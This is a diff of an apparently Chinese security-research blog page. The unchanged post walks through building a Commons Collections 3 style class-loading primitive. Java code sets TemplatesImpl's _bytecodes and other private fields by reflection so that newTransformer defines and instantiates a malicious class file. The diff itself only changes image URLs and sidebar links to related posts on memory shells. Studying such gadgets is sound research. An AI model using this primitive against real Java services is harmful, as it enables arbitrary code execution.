@@ -620,13 +620,13 @@
     <article class="post post-detail">
       <div class="post-content">
         <p>今天没事想自己写个CC3类加载</p>
-<p>结果为了顺利触发到TemplatesImpl#getTransletInstance的newInstance给我整急眼了，使劲改字段强行通过循环<br><img src="https://i-blog.csdnimg.cn/direct/52b9cf112fac47398f1dd43765926eb7.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/52b9cf112fac47398f1dd43765926eb7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>结果为了顺利触发到TemplatesImpl#getTransletInstance的newInstance给我整急眼了，使劲改字段强行通过循环<br><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/52b9cf112fac47398f1dd43765926eb7.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/52b9cf112fac47398f1dd43765926eb7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>刚才判定了，_auxClasses为transient，不能用这种方法</p>
 <p>结果搞了个下面的代码出来</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;CC6TiedMapEntry&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_outputProperties&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">Properties</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_transletIndex&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_auxClasses&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        templatesClass.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>你别说，还真TM能跑。<img src="https://i-blog.csdnimg.cn/direct/bd39e593812d4fe8b63b3e1c14d9cc5b.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/bd39e593812d4fe8b63b3e1c14d9cc5b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">说一下怎么搞的<br>调试的时候bytecode数组只有一个恶意类，就创建不了hashMap，后面就put不进去。<br><img src="https://i-blog.csdnimg.cn/direct/00d7d3bddf1c48db8327039c4c27ac6c.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/00d7d3bddf1c48db8327039c4c27ac6c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">于是我bytecode传了两个恶意数组</p>
+<p>你别说，还真TM能跑。<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/bd39e593812d4fe8b63b3e1c14d9cc5b.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/bd39e593812d4fe8b63b3e1c14d9cc5b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">说一下怎么搞的<br>调试的时候bytecode数组只有一个恶意类，就创建不了hashMap，后面就put不进去。<br><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/00d7d3bddf1c48db8327039c4c27ac6c.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/00d7d3bddf1c48db8327039c4c27ac6c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">于是我bytecode传了两个恶意数组</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code,code&#125;);</span><br></pre></td></tr></table></figure>
-<p>结果进第二个catch，hashMap不能重复put<br><img src="https://i-blog.csdnimg.cn/direct/6c6442df540e46b79bcce2e74b388a0d.png" class="lazyload placeholder" data-srcset="https://i-blog.csdnimg.cn/direct/6c6442df540e46b79bcce2e74b388a0d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">我又传了个空字节，我去，空字节不能defineClass，连循环都出不了</p>
+<p>结果进第二个catch，hashMap不能重复put<br><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/6c6442df540e46b79bcce2e74b388a0d.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/6c6442df540e46b79bcce2e74b388a0d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">我又传了个空字节，我去，空字节不能defineClass，连循环都出不了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code,<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>]&#125;);</span><br></pre></td></tr></table></figure>
 <p>突然想到，我自己搞个hashMap就完了，用他的干毛啊<br>于是</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_auxClasses&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
@@ -957,6 +957,27 @@ https://godownio.github.io/2024/07/31/java-lei
             
 
             <div class="post-img-box">
+              <a href="/2025/04/14/cc-zhu-ru-tomcat-upgrade-executor-he-websocket-nei-cun-ma/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8145.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8145.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-14</span>
+                
+              </div>
+              <a class="post-title" href="/2025/04/14/cc-zhu-ru-tomcat-upgrade-executor-he-websocket-nei-cun-ma/">CC注入Tomcat Upgrade/Executor/WebSocket内存马</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2025/04/09/li-yong-java-object-searcher-gou-jian-tomcat-xian-cheng-hui-xian/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8144.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8144.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
@@ -1032,27 +1053,6 @@ https://godownio.github.io/2024/07/31/java-lei
                 
               </div>
               <a class="post-title" href="/2025/03/25/chang-yong-de-er-ci-fan-xu-lie-hua-gong-ji/">常用的二次反序列化攻击</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/03/25/spring-dispatcherservlet-xiang-jie/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8140.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8140.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">03-25</span>
-                
-              </div>
-              <a class="post-title" href="/2025/03/25/spring-dispatcherservlet-xiang-jie/">DispatcherServlet.doDispatch请求分发详解</a>
             </div>
           </div>
         
